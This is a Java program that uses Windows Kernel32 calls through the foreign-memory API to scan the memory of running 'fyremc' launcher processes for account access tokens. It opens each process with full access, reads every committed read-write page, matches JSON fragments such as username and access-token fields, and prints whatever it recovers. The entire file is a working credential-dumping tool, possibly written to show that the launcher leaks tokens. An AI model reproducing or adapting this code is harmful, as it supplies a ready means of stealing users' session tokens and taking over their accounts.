package azahriah.nemhibas.jdktest;

import azahriah.nemhibas.jdktest.natives.windows.kernel32.Kernel32;
import azahriah.nemhibas.jdktest.natives.windows.kernel32._MEMORY_BASIC_INFORMATION;
import jdk.incubator.foreign.*;

import java.nio.charset.StandardCharsets;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class Main {
    private static final int CHUNK_SIZE = 512;

    public static void main(String[] args) {
        System.out.println("Porog a fornettigyar");
        ExecutorService executor = Executors.newFixedThreadPool(8);

        List<ProcessHandle> processes = ProcessHandle.allProcesses()
            .filter(proc -> proc.info().command().orElse("").toLowerCase().contains("fyremc"))
            .sorted(Comparator.comparingDouble(proc -> proc.info().startInstant().get().getEpochSecond()))
            .sorted(Collections.reverseOrder()).toList();

        if (processes.isEmpty()) {
            System.out.println("[!] The launcher is not running.");
            return;
        }

        processes.forEach(proc ->
            executor.execute(() -> {
                String res = tryFindAccessToken(proc.pid());
                if (!res.isEmpty()) {
                    System.out.println("[!] Found something in " + proc.pid() + " (P): " + res);
                }
            })
        );
        executor.shutdown();
    }

    public static boolean isByteReadable(byte b) {
        return b == 34 || b >= 44 && b <= 46 || b >= 48 && b <= 58 || b >= 65 && b <= 90 || b == 95 || b >= 97 && b <= 123 || b == 125;
    }

    public static String makeReadable(byte[] buffer) {
        StringBuilder plus = new StringBuilder();
        StringBuilder s = new StringBuilder();
        int makeSure = 0;
        for (byte a : buffer) {
            if (!isByteReadable(a)) {
                if (a == 0) {
                    makeSure++;
                    if (makeSure == 2){
                        makeSure = 0;
                        plus = new StringBuilder();
                    }
                    continue;
                }
                plus = new StringBuilder();
            } else {
                makeSure = 0;
                if (plus.length() < 5) {
                    plus.append((char) a);
                    if (plus.length() == 5) {
                        s.append(plus);
                    }
                } else {
                    s.append((char) a);
                }
            }
        }
        return s.toString();
    }

    public static String tryFindAccessToken(long pid) {
        MemoryAddress handle = Kernel32.OpenProcess(Kernel32.PROCESS_ALL_ACCESS(), 0, (int) pid);

        try {
            if (handle == MemoryAddress.NULL) {
                throw new RuntimeException("failed to open handle");
            }

            try (ResourceScope scope = ResourceScope.newConfinedScope()) {
                SegmentAllocator segmentAllocator = SegmentAllocator.ofScope(scope);
                MemorySegment buffer = segmentAllocator.allocateArray(CLinker.C_CHAR, CHUNK_SIZE);

                MemoryAddress pagePointer = MemoryAddress.ofLong(0);
                MemorySegment memoryInfo = _MEMORY_BASIC_INFORMATION.allocate(scope);

                while (Kernel32.VirtualQueryEx(handle, pagePointer, memoryInfo, _MEMORY_BASIC_INFORMATION.sizeof()) != 0) {
                    if (_MEMORY_BASIC_INFORMATION.State$get(memoryInfo) == Kernel32.MEM_COMMIT() &&
                            _MEMORY_BASIC_INFORMATION.Protect$get(memoryInfo) == Kernel32.PAGE_READWRITE()) {
                        for (long i = 0; i < _MEMORY_BASIC_INFORMATION.RegionSize$get(memoryInfo); i += CHUNK_SIZE) {
                            MemoryAddress readPointer = pagePointer.addOffset(i);

                            if (Kernel32.ReadProcessMemory(handle, readPointer, buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
                                String bufferString = new String(buffer.toByteArray(), StandardCharsets.US_ASCII);

                                boolean runOld;
                                int endIdx;
                                int offset = bufferString.indexOf("{");

                                if (offset == -1) {
                                    continue;
                                }
                                String withoutNull = bufferString.substring(offset).replace("\0", "");

                                if (withoutNull.startsWith("{\"usern") && !withoutNull.contains(",\"p") && !withoutNull.contains(",\"h")) {
                                    runOld = false;
                                    endIdx = bufferString.substring(offset).indexOf(",\"s");
                                } else if ((offset = bufferString.indexOf("{\"acc")) > -1) {
                                    runOld = true;
                                    endIdx = bufferString.substring(offset).indexOf("}");
                                } else {
                                    continue;
                                }

                                if (endIdx > 0) {
                                    bufferString = makeReadable(buffer.asSlice(offset, endIdx).toByteArray());
                                    if (bufferString.contains(",\"p") || bufferString.contains(",\"h")) continue;
                                    return bufferString + (runOld ? "}}" : "}");
                                }

                                if (Kernel32.ReadProcessMemory(handle, readPointer.addOffset(offset), buffer, CHUNK_SIZE, MemoryAddress.NULL) != 0) {
                                    bufferString = makeReadable(buffer.toByteArray());
                                    endIdx = runOld ? bufferString.indexOf("}") : bufferString.indexOf(",\"s");

                                    if (endIdx == -1) {
                                        continue;
                                    }

                                    return bufferString.substring(0, endIdx) + (runOld ? "}}" : "}");
                                }
                            }
                        }
                    }

                    pagePointer = pagePointer.addOffset(_MEMORY_BASIC_INFORMATION.RegionSize$get(memoryInfo));
                }
            }
            return "";
        } finally {
            Kernel32.CloseHandle(handle);
        }
    }
}
